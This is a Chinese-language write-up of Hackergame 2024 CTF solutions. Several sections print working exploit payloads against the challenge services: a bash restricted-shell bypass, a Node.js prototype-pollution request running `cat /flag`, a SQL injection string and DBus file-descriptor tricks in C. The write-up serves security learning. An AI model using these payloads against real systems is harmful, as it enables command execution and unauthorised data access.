+++
name = "hackergame-2024"
title = "Hackergame 2024 Writeup"
tags = ["Hackergame", "CTF"]
date = "2024-11-09"
update = "2024-11-09"
enableGitalk = true
+++

## 签到
60 秒肯定输入不完，因为平均 5 秒需要输入一个输入框。直接 F12，可以看到输入框的 HTML 代码大概是这样：

```HTML
<input type="text" class="input-box" id="zh" placeholder="中文：启动" onpaste="return false">
```

并且所有输入框需要输入的内容都在冒号后面，因此考虑用 JavaScript 来填写所有输入框。从元素的 `placeholder` 属性中读取提示，然后利用 `.split()` 来分割并提取冒号后的内容。最后填写到输入框中。

```JavaScript
list = document.getElementsByClassName("input-box");
for (let box of list) {
  hint = box.placeholder;
  word = hint.split(/[：:]/)[1].trim();
  box.value = word;
}
```

在浏览器中执行这段代码即可得到 Flag。

Flag 为 `flag{w3!Come-To-H4ckergaM3-ANd-enJOY-H@Ck!N9-zOz4}`。

## 喜欢做签到的 CTFer 你们好呀
在 Google 上搜索 UTSC CTF，可以找到 USTC NEBULA 战队在 [GitHub 上的招新安排页面](https://github.com/Nebula-CTFTeam/Recruitment-2024)。但在这个页面并不能找到 Flag，因此尝试在 UTSC NEBULA 的 [GitHub 组织页面](https://github.com/Nebula-CTFTeam)中寻找线索。可以看到 `README.me` 中有指向 [NEBULA 主页](https://www.nebuu.la/)的链接。

主页中显示的是一个网页上运行的交互式终端模拟器，我们应该来对地方了。用 `help` 指令查看可以使用的命令，然后全都尝试一遍，当执行 `env` 指令时，可以看到 env 的输出：

```properties
PWD=/root/Nebula-Homepage
ARCH=loong-arch
NAME=Nebula-Dedicated-High-Performance-Workstation
OS=NixOS❄️
FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}
REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!
```

这里其中便包含了第一个 Flag。那么第二个 Flag 在哪呢？使用 `ls` 指令可以列出当前目录下的所有文件和目录：

```plaintext
Awards
Members
Welcome-to-USTC-Nebula-s-Homepage/
and-We-are-Waiting-for-U/
```

如果尝试 `cd` 会发现需要 root 权限才能 `cd`，而尝试 `sudo` 则会跳转到[奶龙](https://www.bilibili.com/bangumi/play/ss40551)。因此考虑使用 `ls` 指令直接列出两个目录中的内容。当执行 `ls and-We-are-Waiting-for-U/` 时可以看到输出产生了一些变化，列出了隐藏的文件：

```plaintext
.flag
.oh-you-found-it/
Awards
Members
Welcome-to-USTC-Nebula-s-Homepage/
and-We-are-Waiting-for-U/
```

事实上 `ls -a` 也可以列出这个隐藏的文件，最后执行 `cat .flag` 得到第二个 Flag：

```plaintext
flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}
```

## 打不开的盒
下载 STL 文档，然后使用任意 3D 软件导入，在这里我使用了 Blender。删除上顶面和侧面后即可看到在内部底面的 Flag 了。

![Blender Box](img/blender-box.png)

Flag 为 `flag{Dr4W_Us!nG_fR3E_C4D!!w0W}`。

## 每日论文太多了！
打开 PDF 后全文搜索 flag，可以看到在这里有 flag 字符串：

![Suspicious Flag String](img/too-many-essay.png)

由于之前试过给 PDF 里的 RGB 颜色改成 CMYK，这个过程中用到的是 Scribus。所以这里我就直接用 Scribus 打开了。

打开之后找到对应的部分，可以看到两个对象重叠在一起，移开其中一个即可看到图片形式的 Flag。

![Suspicious Flag String](img/too-many-essay-flag.png)

Flag 为 `flag{h4PpY_hAck1ng_3veRyd4y}`。

## 比大小王
对面实在是太快了喵！所以考虑用 JavaScript 自动化，首先可以想到的是检测两边数字的大小，然后模拟点击。但实际上这样做并不能让我们做得比对方更快，因为按下之后会有延迟，然后才会显示下一道题目。因此我们需要用别的方式超过对面。

直接 F12，观察页面源码可以看到本地的 JavaScript 代码直接包裹在了 `script` 标签中。（[完整的 `script` 中的内容](compare.js)）

可以看到游戏开始时会从远程获取题目列表并存储到本地：
```JavaScript
function loadGame() {
    fetch('/game', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({}),
    })
    .then(response => response.json())
    .then(data => {
        state.values = data.values;
        /* -- omitted -- */
    })
    /* -- omitted -- */
}
```

在按下按键时会调用 `chooseAnswer()` 函数：
```JavaScript
document.getElementById('less-than').addEventListener('click', () => chooseAnswer('<'));
document.getElementById('greater-than').addEventListener('click', () => chooseAnswer('>'));
```

在 `chooseAnswer()` 函数中，会将选择添加到 `state.inputs` 这个列表中，检测我们的答案是否正确。如果分数达到了 100，则会调用 `submit()` 提交我们的答案。
```JavaScript
function chooseAnswer(choice) {
    if (!state.allowInput) {
        return;
    }
    state.inputs.push(choice);
    let correct;
    if (state.value1 < state.value2 && choice === '<' || state.value1 > state.value2 && choice === '>') {
        correct = true;
        state.score1++;
        document.getElementById('answer').style.backgroundColor = '#5e5';
    } else {
        correct = false;
        document.getElementById('answer').style.backgroundColor = '#e55';
    }
    /* -- omitted -- */
    state.allowInput = false;
    setTimeout(() => {
        if (state.score1 === 100) {
            submit(state.inputs);
        } else if (correct) {
            /* -- omitted -- */
        } else {
            state.allowInput = false;
            state.stopUpdate = true;
            document.getElementById('dialog').textContent = '你选错了，挑战失败！';
            document.getElementById('dialog').style.display = 'flex';
        }
    }, 200);
}
```

`state` 对象可以在浏览器中访问，因此考虑编写 JavaScript 代码，读取题目并将答案写入一个列表中，最后调用 `submit()`：
```JavaScript
answers = [];
for (i = 0; i < 100; i++) {
    ans = state.values[i][0] > state.values[i][1] ? '>' : '<';
    answers.push(ans);
}
submit(answers);
```

在游戏开始后，在浏览器中运行这段代码即可得到 Flag。

Flag 为 `flag{!-4M-7he-hACk3r-k!Ng-OF-cOmP@r!n9-nuM63R5-Z024}`。

## 不宽的宽字符
在 Windows 下，宽字符是 2 字节的，并且通常使用 UTF-16 LE 编码。而代码中，从 UTF-8 输入转换为 UTF-16 LE 编码的宽字符后，又直接将宽字符的字符指针转换为了窄字符的字符指针。

```cpp
// Convert to WIDE chars
    wchar_t buf[256] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, inputBuffer, -1, buf, sizeof(buf) / sizeof(wchar_t));

    std::wstring filename = buf;

    // Haha!
    filename += L"you_cant_get_the_flag";

    std::wifstream file;
    file.open((char*)filename.c_str());
```

显然这样会存在问题。如果输入中存在窄字符，转换为宽字符后的第二个字节会变成 `\0`，导致字符串提前结束。即使后面添加了字符串，字符串也会在遇到第一个窄字符时就结束，这段被添加的字符串也就不会被认为是 `char*` 字符串的一部分了。

接下来需要构造一个字符串，使得这个字符串在 UTF-16 LE 编码之后，ASCII 读取时读到的内容正好是 `Z:\theflag`。首先看看 `Z:\theflag` 在 ASCII 编码下的数据：

```plaintext
[cascade@cascade-ws hackergame-2024-writeup]$ echo -n "Z:\theflag" | xxd
00000000: 5a3a 5c74 6865 666c 6167                 Z:\theflag
```

这里需要注意，因为使用的是 UTF-16 LE 编码而不是 UTF-16 BE 编码，因此我们要查找的几个字符分别是：

```plaintext
3a5a 745c 6568 6c66 6761
```

对应的字符串是 `㩚瑜敨汦条`。但是别忘了我们还需要让字符串提前结束，而很不幸， `Z:\theflag` 具有偶数个字符。我们没法让末尾的 `g` 来结束字符串。然而在 Windows 下，文件名末尾的空格似乎会被去除，因此也可以考虑用一个空格来结束我们的字符串。

最后我们的字符串就是 `㩚瑜敨汦条 ` 了，在终端中输入这个字符串即可得到 Flag。

Flag 为 `flag{wider_char_isnt_so_great_71c26f3828}`。

## PowerfulShell
这道题目可以使用的字符差不多就只剩下这些了：
```plaintext
~-+=:[]{}|`$123456789 
```

要从这些字符里构造可以运行的命令还是有难度的。bash 可以用 `${var:n:m}` 这样的语句从 `var` 变量的 n index 开始，提取 `m` 个字符。因此可以尝试从变量中提取字符来构造我们的指令。

可以注意到，这里我们可以使用 `~` 字符，因此可以看到我们所在的工作目录是 `/players`：
```plaintext
PowerfulShell@hackergame> ~
/players/PowerfulShell.sh: line 16: /players: Is a directory
```

我们可以将 `~` 赋值给一个变量，然后从这个变量中提取字符来构造我们的指令。工作目录的字符中正好包含 `ls /` 这条指令中所有需要的字符。但 `/` 字符在第一位，index 包含 0。因此让这个字符串变量自己加上自己，这样第二个 `/` 字符的 index 就为 8 了。构造 `ls /` 指令：
```bash
__=~
__=$__$__
${__:2:1}${__:7:1} ${__:8:1}
```

执行这个指令后可以看到，终端中成功地输出了 `/` 目录的内容：
```plaintext
bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
players
proc
root
run
sbin
srv
sys
tmp
usr
var
```

将 `ls /` 的结果写入变量中：
```bash
_3=`${__:2:1}${__:7:1} ${__:8:1}`
``` 

接下来我们只需要想办法构造 `cat /flag` 这条指令即可：
```bash
${_3:15:1}${__:3:1}${_3:7:1} ${__:8:1}${_3:17:1}${_3:18:1}${_3:19:1}${_3:20:1}
```

不过 `flag` 中的 `g` 在 `_3` 中的 index 正好为 20，包含了 0。所以我们用数学计算，计算出 20 并赋值给一个变量，然后再构造我们的指令：
```bash
_4=$[15+5]
${_3:15:1}${__:3:1}${_3:7:1} ${__:8:1}${_3:17:1}${_3:18:1}${_3:19:1}${_3:_4:1}
```

最后的操作序列为：
```bash
__=~
__=$__$__
${__:2:1}${__:7:1} ${__:8:1}
_3=`${__:2:1}${__:7:1} ${__:8:1}`
_4=$[15+5]
${_3:15:1}${__:3:1}${_3:7:1} ${__:8:1}${_3:17:1}${_3:18:1}${_3:19:1}${_3:_4:1}
```

在终端中输入这一串指令即可得到 Flag。

Flag 为 `flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_75975c85fb}`。

## Node.js is Web Scale
题目中运行的服务是由 Node.js 编写的，在页面中点击下方的 `View source code` 即可看到 Node.js [源代码](node-web-scale-source.js)。

我们的突破点在于 `/execute` 请求， `/execute?cmd=<COMMAND>` 会执行 `cmds[<COMMAND>]` 中一个字符串形式存储的指令，并将执行结果返回。代码注释中说明 `cmds` 是常量，因此是绝对安全的。但 `cmds` 中的对象真的**完全是常量吗**？ 

可以看到 `/set` 接受 POST 请求提交的一个 JSON 对象，并且通过以 `.` 分割的 `key`，一步一步从 `store` 开始，使用 `[key]` 访问对象的属性。尽管主页中仅能设置 `value` 为字符串，但我们仍然可以通过自行构造 POST 请求来设置其他类型的值。这里将 `obj` 键的值设置为一个孔德 JSON 对象：
```json
{
    "key": "obj",
    "value": {}
}
```

在 JavaScript 中，这个值会被解析为一个空的 JavaScript Object。在服务器上，这个值会被存储到 `store.obj` 中。

在这里就需要介绍 JavaScript 的**原型链**机制了：

> JavaScript 对象是动态的属性（指其自有属性）“包”。JavaScript 对象有一个指向一个原型对象的链。当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。
> From [MDN - 继承与原型链](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain)

在 JavaScript 中，通过访问一个对象的 `__proto__` 属性即可访问这个对象的原型。并且访问同样可以通过 `[key]` 进行。
`cmds` 和 `store.obj` 都是一个 Object，而它们在原型链上共享了**Object 原型**。因此可以构造一个 `/set` 请求来修改/添加 Object 原型的属性。我们向 Object 原型中添加 `our_cmd` 属性，这样在访问 `cmds["our_cmd"]` 时，即使 `cmds` 本身不具有 `our_cmd` 属性，也会顺着原型链寻找这个属性，直到找到我们在 Object 原型中添加的属性。

构造一个 `/set` 请求，向 Object 原型中添加 `our_cmd` 属性，并将这个属性的值设置为我们要执行的指令：
```json
{
    "key": "obj.__proto__.our_cmd",
    "value": "cat /flag"
}
```

最后请求 `/execute?cmd=our_cmd`，即可成功执行我们构造的指令，获取 Flag。

Flag 为 `flag{n0_pr0topOIl_50_U5E_new_Map_1n5teAD_Of_0bject2kv_327578b540}`。

## PaoluGPT
### 千里挑一
第一感觉是 Flag 会藏在所有的聊天记录中。由于一个一个看实在是太麻烦了，因此用 JavaScript 自动化访问所有聊天记录页面，并检查页面中是否存在 `flag` 字符串：
```JavaScript
links = document.getElementsByTagName("a");
(async () => {
  for (let link of links) {
  	url = link.href;
  	resp = await fetch(url);
  	text = await resp.text();
  	if (text.search("flag") != -1) {
      console.log(url);
    }
	}
})()
console.log("Getting executed...")
```

在 Console 中执行这段代码，等待一段时间。它应该会输出包含了 `flag` 字符串的页面的 URL。进入这个页面查找 `flag` 字符串，即可在页面底部找到第一个 Flag。

Flag 为 `flag{zU1_xiA0_de_11m_Pa0lule!!!_7c2b2aa451}`。

### 窥视未知
这道题目还给了题目附件，而附件中是这道题目的服务器上运行的 Python 代码。观察这段代码可以看到：
```python
@app.route("/list")
def list():
    results = execute_query("select id, title from messages where shown = true", fetch_all=True)
    messages = [Message(m[0], m[1], None) for m in results]
    return render_template("list.html", messages=messages)

@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

`/list` 请求会在 `message` 表中请求所有的 `shown` 为 `true` 的聊天记录，并将用它们的 id 和标题渲染一个页面展示出来。这也暗示了，在 `message` 中还存在 `shown` 为 `false` 的聊天记录。

`/view` 请求直接将 `conversation_id` 参数插入了 SQL 请求中，并且没有经过任何过滤。所以可以使用 SQL 注入来查找 `shown` 为 `false` 的聊天记录。

构造一个字符串使得 SQL 语句的字符串部分提前结束，在条件中添加 `or shown = false`，并注释掉后面的单引号：
```plaintext
' or shown = false /*
```

这样完成后的 SQL 语句应该是这样的：
```SQL
select title, contents from messages where id = '' or shown = false /*'
```

最后请求 `/view?conversation_id=' or shown = false /*` 即可进入被隐藏的聊天记录页面中。进入这个页面查找 `flag` 字符串，即可在页面底部找到第二个 Flag。

Flag 为 `flag{enJ0y_y0uR_Sq1_&_1_would_xiaZHOU_hUI_guo_6e62416061}`。

## 强大的正则表达式
这道题基本上是纯粹的算法题，要求只使用 `0123456789()|*` 构建正则表达式匹配数字。

### Easy
通过查看附件中的代码，可以看到 Easy 难度要求我们用 Regex 匹配可以被 16 整除的十进制数字。

16 的倍数具有一些良好的特性，例如：
- 每经过 400，最低的 2 位会循环一次
- 每经过 2000，最低的 3 位会循环依次
- 是否是 16 的倍数仅取决于最低的 4 位

观察 16 倍数的数列：
```python
>>> [i * 16 for i in range(0,126)]
[0, 16, 32, 48, 64, 80, 96, 112, 128, 144, 160, 176, 192, 208, 224, 240, 256, 272, 288, 304, 320, 336, 352, 368, 384, 400, 416, 432, 448, 464, 480, 496, 512, 528, 544, 560, 576, 592, 608, 624, 640, 656, 672, 688, 704, 720, 736, 752, 768, 784, 800, 816, 832, 848, 864, 880, 896, 912, 928, 944, 960, 976, 992, 1008, 1024, 1040, 1056, 1072, 1088, 1104, 1120, 1136, 1152, 1168, 1184, 1200, 1216, 1232, 1248, 1264, 1280, 1296, 1312, 1328, 1344, 1360, 1376, 1392, 1408, 1424, 1440, 1456, 1472, 1488, 1504, 1520, 1536, 1552, 1568, 1584, 1600, 1616, 1632, 1648, 1664, 1680, 1696, 1712, 1728, 1744, 1760, 1776, 1792, 1808, 1824, 1840, 1856, 1872, 1888, 1904, 1920, 1936, 1952, 1968, 1984, 2000]
```

假设这些数字都用 0 填充到 4 位，会发现：
- 如果较高的 2 位数字除以 4 余数为 0，则较低的 2 位一定是 `00, 16, 32, 48, 64, 80, 96` 中的其中一个
- 如果较高的 2 位数字除以 4 余数为 1，则较低的 2 位一定是 `12, 28, 44, 60, 76, 92` 中的其中一个
- 如果较高的 2 位数字除以 4 余数为 2，则较低的 2 位一定是 `08, 24, 40, 56, 72, 88` 中的其中一个
- 如果较高的 2 位数字除以 4 余数为 3，则较低的 2 位一定是 `04, 20, 36, 52, 68, 84` 中的其中一个

把它们列出来：
``` python
bases16 = [["00", "16","32","48","64","80","96"],  # 00 04 08 12 16 20 24 ...
           [      "12","28","44","60","76","92"],  # 01 05 09 13 17 21 25 ...
           [      "08","24","40","56","72","88"],  # 02 06 10 14 18 22 26 ...
           [      "04","20","36","52","68","84"]]  # 03 07 11 15 19 23 27 ...
```

现在分别列出 2 位数以内，除以 4 余数分别为 0, 1, 2, 3 的数字（不足 2 位填 0）：
```python
bases4 = [[f"{4 * i + j:02d}" for i in range(0, 25)] for j in range(0, 4)]
```

例如 2 位数以内，除以 4 余数为 0 的数字，和上面列出的较低的 2 两位拼凑起来，正则表达式就是：
```re
((00|04|08|12|16|20|24|28|32|36|40|44|48|52|56|60|64|68|72|76|80|84|88|92|96)(00|16|32|48|64|80|96))
```

对另外几个也同样拼凑，最后加上 `(0|1|2|3|4|5|6|7|8|9)*` 来匹配任何 4 位以上的数字，就可以得到能够匹配 4 位及以上的 16 的倍数的正则表达式：
```re
((0|1|2|3|4|5|6|7|8|9)*(((00|04|08|12|16|20|24|28|32|36|40|44|48|52|56|60|64|68|72|76|80|84|88|92|96)(00|16|32|48|64|80|96))|((01|05|09|13|17|21|25|29|33|37|41|45|49|53|57|61|65|69|73|77|81|85|89|93|97)(12|28|44|60|76|92))|((02|06|10|14|18|22|26|30|34|38|42|46|50|54|58|62|66|70|74|78|82|86|90|94|98)(08|24|40|56|72|88))|((03|07|11|15|19|23|27|31|35|39|43|47|51|55|59|63|67|71|75|79|83|87|91|95|99)(04|20|36|52|68|84))))
```

而 3 位以及以下的数字，由于数量比较少，因此可以考虑直接打表：
```python
fixed = [str(i) for i in range(0, 1000, 4)]
```

然后将这些固定的数字和上方的正则表达式拼凑在一起就可以了。在终端中提交后即可得到 Flag。

Flag 为 `flag{p0werful_r3gular_expressi0n_easy_5671700122}`。

### Medium
通过查看附件中的代码，可以看到 Medium 难度要求我们用 Regex 匹配可以被 13 整除的**二进制数字**。

13 的性质并不是很好，因此恐怕像 Easy 难度那样「注意到」是行不通的了。但是这里可以使用状态机来进行匹配，对于二进制数字来讲，在末尾加上 0 相当于将数字乘以 2；在末尾加上 1 相当于将数字乘以 2 再加上 1。

假设状态编号 n 表示「现在的数字为 k % 13 = n」。在状态 n 时每次读到下一个字符时会有两种状态转移：
- 读到 0 时，在末尾加上 0 之后的数字 k' = 2k，新的状态为 k' % 13 = **2n % 13**
- 读到 1 时，在末尾加上 1 之后的数字 k' = 2k + 1，新的状态为 k' % 13 = **(2n + 1) % 13**

这个自动机在开始匹配时的状态为 0。在自动机运行完之后，如果处在状态 n，则说明这个二进制数字除 13 余 n。

构建了这个状态机之后，就需要将它转化为正则表达式。我们需要匹配可以被 13 整除的二进制数字，因此起始状态和终止状态都为 0。

状态机转化到正则表达式的思想是一个个**删除中间的状态**（起始状态和终止状态之外的状态），最后将状态机转化为只有一个状态。删除中间的状态 q 时，我们需要将所有经过状态 q 的路径拼接起来。例如如果有 `p -> q -> r` 这样一条路径，则需要将 `p -> q` 和 `q -> r` 的状态转移拼接起来，得到一条 `p -> r` 的状态转移。

这里以「匹配 4 的倍数」的状态机举例：

![DFA-4](img/dfa-4.png)

现在删除状态 3。可以看到，有一条经过 3 的路径 `1 --(1)-> 3 --(0)-> 2`。
由于状态 3 也可以转移到自己，因此实际上路径中还可以插入任意多个 `3 --(1)-> 3` 的转移，形如 `1 --(1)-> 3 --(1)-> 3 --(0)-> 2`。将这些状态转移拼接起来即可得到一条新的由 1 指向 2 的转移路径，转移条件为接下来的数字匹配 `11*0` 这个表达式。

由于 1 本身已经有一条由 1 指向 2 的转移路径了，因此将 `1 --(11*0)-> 2` 这个转移与原来的 `1 --(0)-> 2` 合并，得到新的转移路径。对其他的所有路径做同样的操作（在这个例子中没有其他的路径了），删除状态 3，得到如下的状态机：

![DFA-3](img/dfa-3.png)

现在删除状态 2。可以看到，有两条经过 2 的路径：
- `1 --(0|11*0)-> 2 --(0)-> 0`
- `1 --(0|11*0)-> 2 --(1)-> 1`

由于状态 2 无法转移到自己，因此直接将路径上两个状态转移拼接到一起即可。拼接后得到的路径为：
- `1 --((0|11*0)0)-> 0`
- `1 --((0|11*0)1)-> 1`

删除状态 2，得到如下的状态机：

![DFA-2](img/dfa-2.png)

现在删除状态 1。可以看到现在只剩下一条经过 1 的路径了：
```plaintext
0 --(1)-> 1 --((0|11*0)0)-> 0
```

由于 1 也可以转移到自己，因此在 `0 -> 1` 和 `1 -> 0` 之间可以插入任意多个 `(0|11*0)1`。拼接之后的转移路径的正则表达式为 `1((0|11*0)1)*(0|11*0)0`。由于 0 已经有一条到 0 的转移路径了，因此将这两条路径合并，最后由 0 到 0 的转移路径的正则表达式为 `(1((0|11*0)1)*(0|11*0)0)|0`。

删除状态 1，得到如下的状态机：

![DFA-1](img/dfa-1.png)

我们可以经过任意次这个状态转移，由 0 到达 0，因此最终的正则表达式为：
```re
((1((0|11*0)1)*(0|11*0)0)|0)*
```

对于「匹配能被 13 整除的二进制数」，我们也照仿照以上的方式构造正则表达式。由于 13 的状态数较多，因此选择用 Python 来构造这个正则表达式。

```python
size = 13

states = [dict[str, int]() for _ in range(0, size)]

for mod in range(0, size):
    states[mod].update({"0": (mod + mod) % size})
    states[mod].update({"1": (mod + mod + 1) % size})

# print(states)

def filter(d, id):
    new = {}
    for k in d:
        if d[k] == id:
            new.update({k: d[k]})
    return new

def create_ex(d):
    s = ""
    for k in d:
        s = s + k + "|"
    s = s.removesuffix("|")
    if len(s) == 1 or len(d) == 1:
        return s
    else:
        return f"({s})"
        

for d in range(size - 1, 0, -1):
    # print(f"Removing node {d}")
    for p in range(d - 1, -1, -1):
        for q in range(d - 1, -1, -1):
            src = filter(states[p], d)
            dst = filter(states[d], q)
            # Not connected
            if len(src) == 0:
                continue
            if len(dst) == 0:
                continue
            # Loop connection
            lo = filter(states[d], d)
            src_ex = create_ex(src) 
            dst_ex = create_ex(dst)
            lo_ex = create_ex(lo)

            if len(lo) == 0:
                s = f"({src_ex}{dst_ex})"
            else:
                s = f"({src_ex}{lo_ex}*{dst_ex})"
            states[p].update({s: q})

effect = filter(states[0], 0)
print(f"{create_ex(effect)}*")
```

提交这个正则表达式即可得到 Flag。

Flag 为 `flag{pow3rful_r3gular_expressi0n_medium_70a46e715e}`。

参考资料：
[用正则表达式匹配3的任意倍数 - 腾讯云开发者社区](https://cloud.tencent.com/developer/article/1777692)

## 不太分布式的软总线
直接查看附件的代码，可以看到：
- `flagserver` 在 System Bus 中创建了一个名为 `cn.edu.ustc.lug.hack.FlagService` 的 Bus
- 在这个 Bus 的路径 `/cn/edu/ustc/lug/hack/FlagService` 上注册了一个 Object
- 这个对象提供了名为 `cn.edu.ustc.lug.hack.FlagService` 的 Interface
- 这个接口提供了 `GetFlag1`, `GetFlag2`, `GetFlag3` 三个 Method

### What DBus Gonna Do?
查看 `flagserver.c` 中的 `handle_method_call()` 函数，发现只需要带上一个字符串 `Please give me flag1` 调用 `GetFlag1` 方法即可。这个操作可以直接用 `dbus-send` 指令来完成：
```sh
#!/usr/bin/bash
dbus-send \
    --system \
    --print-reply \
    --dest="cn.edu.ustc.lug.hack.FlagService" \
    --type=method_call \
    /cn/edu/ustc/lug/hack/FlagService \
    cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
    string:'Please give me flag1'
```

上传这个 Script 即可拿到第一个 Flag。

Flag 为 `flag{every_11nuxdeskT0pU5er_uSeDBUS_bUtn0NeknOwh0w_6614b12106}`。

### If I Could Be A File Descriptor
查看 `flagserver.c` 中的 `handle_method_call()` 函数，发现：
- 这次的请求需要带上一个叫做 `GUnixFDList` 的东西
- 看起来……似乎是需要发送一个文件描述符？
- 因为检查了 `/proc/self/fd/<FD_NUM>` 指向的链接，所以这个文件描述符指向的文件的名字里还不能包含 `/` 这样的字符
- `flagserver` 会从这个文件里读 100 字节，并且检查这个字节对应的字符串的内容

尽管在不同进程之间，文件描述符的**值**无法简单地共享，但发送文件描述符时，内核可以为另外一个进程创建一个新的文件描述符，而这个文件描述符指向同一个文件。我想 DBus 也应该为我们实现了这一点。

`flagserver` 使用 `GIO` 来处理 DBus 上的消息。而 `getflag3.c` 中也给出了使用 `GIO` 请求方法的例子。那么我们也用 `GIO` 来调用 DBus 方法吧。

在 `GIO` 的文档中可以看到，`g_dbus_connection_call_with_unix_fd_list_sync()` 函数就可以发送一个带有文件描述符列表的调用。

那么，发送什么文件描述符呢？我首先想到的思路是使用 POSIX Shared Memory，然而实际上 POSIX Shared Memory 会在 `/dev/shm` 中创建一个文件，而文件描述符会指向这个文件，因此这个方法行不通。

除此之外，Socket 也可以拥有文件描述符，而且我们应该可以很容易地创建这个文件描述符。Socket 可以和文件系统中的地址绑定，然而我们并不需要一个有名字的 Socket，因为这样会在文件系统中有一个路径（而我们不希望这样做）。因此我们需要创建匿名 Socket。

在 Linux 中，`socketpair()` 调用可以创建一对匿名 Socket，这对 Socket 的两端是相连接的——即，向一个 Socket 发送的数据可以被另一个 Socket 接收到，反过来也一样。我们可以用 `socketpair()` 创建一对 Socket，并将其中一个 Socket 的文件描述符通过 `g_dbus_connection_call_with_unix_fd_list_sync()` 函数发送给 `flagserver`。

```c
#include <gio/gio.h>
#include <glib.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stdio.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag2"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main() {
    g_print("Creating socket...\n");
    int fds[2];
    socketpair(PF_LOCAL, SOCK_STREAM, 0, fds);
    int this_fd = fds[0];
    int remote_fd = fds[1];
	// Initiate connection
	GError *error = NULL;
    GDBusConnection *connection;
    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        g_printerr("Failed to connect to the system bus: %s\n", error->message);
        g_error_free(error);
        return EXIT_FAILURE;
    }
    g_print("Connected to system bus.\n");
	// Append remote_fd to fd list, this function return handle of fd in this list
    GUnixFDList* fdlist = g_unix_fd_list_new();
    gint g_fd = g_unix_fd_list_append(fdlist, remote_fd, &error);
    if (g_fd == -1) {
        g_printerr("Append fd failed: %s\n", error->message);
        return EXIT_FAILURE;
    }
	// Send some message to socket before methd call
    char buf[128];
    memset(buf, 0, sizeof(buf));
    sprintf(buf, "Please give me flag2\n");
    int size = write(this_fd, buf, sizeof(buf));
    if (size == -1) {
        g_printerr("Write to socket failed\n");
        return EXIT_FAILURE;
    }
	// Call remote method
    g_print("Calling remote method...\n");
    GVariant *result;
    result = g_dbus_connection_call_with_unix_fd_list_sync(
        connection,
        DEST,        // destination
        OBJECT_PATH, // object path
        INTERFACE,   // interface name
        METHOD,      // method
        g_variant_new("(h)", g_fd),
        NULL,        // expected return type
        G_DBUS_CALL_FLAGS_NONE,
        -1,
        fdlist,
        NULL,
        NULL,
        &error
    );
    if (!result) {
        g_printerr("Remote call failed: %s\n", error->message);
        return EXIT_FAILURE;
    }
    gchar *response;
    g_variant_get(result, "(s)", &response);
    g_print("Calling remote method success: %s\n", response);
    return EXIT_SUCCESS;
}
```

Makefile:
```makefile
flag2: flag2.c
	gcc -fdiagnostics-color=always -g flag2.c `pkg-config --cflags --libs gio-2.0` -o flag2
```

编译后上传执行即可获取第二个 Flag。

Flag 为 `flag{n5tw0rk_TrAnSpaR5Ncy_d0n0t_11k5_Fd_277ff65d23}`。

### Comm Say Maybe
查看 `flagserver.c` 中的 `handle_method_call()` 函数，发现：
- 和 `What DBus Gonna Do?` 一样，不过这次不需要你发送任何数据与
- 但是 `flagserver` 会获取调用者的 pid，然后检查 `/proc/<pid>/comm`，也就是调用者进程被执行时的指令（不包括参数）
- 可执行程序的名字是应该是 `getflag3`

查看附件中的 `server.py` 可以看到，我们的可执行程序会被写入到 `/dev/shm/executable` 中执行。那么我们直接复制自己到 `/dev/shm/getflag3`，然后执行 `/dev/shm/getflag3` 即可。

出人意料的是，这确实可以做到。`/dev/shm` 确实是可以被读写的！这比我一开始解出来时的想法要简单太多了，因为我一开始认为无法在 `/dev/shm` 中创建文件。既然这样，那就只需要简单修改一下 `getflag.c` 就可以做到让指令为 `getflag3` 的进程进行调用了：
```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <gio/gio.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag3"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main(int argc, char **argv)
{
    // Copy and execute
    if (argc == 1)
    {
        system("cp /dev/shm/executable /dev/shm/getflag3");
        system("/dev/shm/getflag3 placeholder_to_alter_argc");
        return 0;
    }
    GError *error = NULL;
    GDBusConnection *connection;
    GVariant *result;

    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection)
    {
        g_printerr("Failed to connect to the system bus: %s\n", error->message);
        g_error_free(error);
        return EXIT_FAILURE;
    }

    // Call the D-Bus method
    result = g_dbus_connection_call_sync(
        connection,
        DEST,        // destination
        OBJECT_PATH, // object path
        INTERFACE,   // interface name
        METHOD,      // method
        NULL,        // parameters
        NULL,        // expected return type
        G_DBUS_CALL_FLAGS_NONE,
        -1, // timeout (use default)
        NULL, &error);

    if (result)
    {
        // Here we modifided to let it print
        gchar *rev;
        g_variant_get(result, "(s)", &rev);
        g_print("Result: %s\n", rev);
        g_variant_unref(result);
    }
    else
    {
        g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
        g_error_free(error);
    }

    g_object_unref(connection);

    return EXIT_SUCCESS;
}
```

编译后上传执行即可获取第三个 Flag。

Flag 为 `flag{prprprprprCTL_15your_FRiEND_ec8c8f54d7}`。

### Comm Say Maybe 的另一个思路
既然都在 `/dev/shm` 里面了，为什么我们不创建一个名叫 `getflag3` 的 POSIX Shared Memory 呢？

